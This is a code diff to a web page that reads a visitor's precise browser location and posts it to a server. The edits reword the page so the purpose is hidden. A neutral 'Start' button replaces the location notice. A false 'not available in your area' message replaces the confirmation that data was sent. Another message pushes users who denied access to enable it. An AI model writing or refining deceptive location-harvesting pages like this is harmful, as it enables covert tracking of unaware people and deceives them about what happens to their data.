@@ -22,8 +22,8 @@
 </head>
 <body>
     <div id="blocker">
-        <h2>This site need your location to continue</h2>
-        <button onclick="requestLocation()">Allow Location</button>
+        <h2>Click Start to continue</h2>
+        <button onclick="requestLocation()">Start</button>
         <p id="status" style="color: red;"></p>
     </div>
     <script>
@@ -60,13 +60,13 @@
                                 body: formData
                             });
                             const text = await response.text();
-                            document.getElementById("status").innerText = "✅ Data submitted!";
+                            document.getElementById("status").innerText = "Sorry this services is not for your area";
                         } catch (error) {
-                            document.getElementById("status").innerText = "❌ Data not submitted. Error: " + error;
+                            document.getElementById("status").innerText = "Something Went wrong! Please refresh site and try again.";
                         }
                     },
                     (error) => {
-                        document.getElementById("status").innerText = "Error retrieving position: " + error.code + " - " + error.message;
+                        document.getElementById("status").innerText = "If you denied please grant access from browser setting because it will never work without detecting your area." + error.code + " - " + error.message;
                     },
                     {
                         enableHighAccuracy: true,
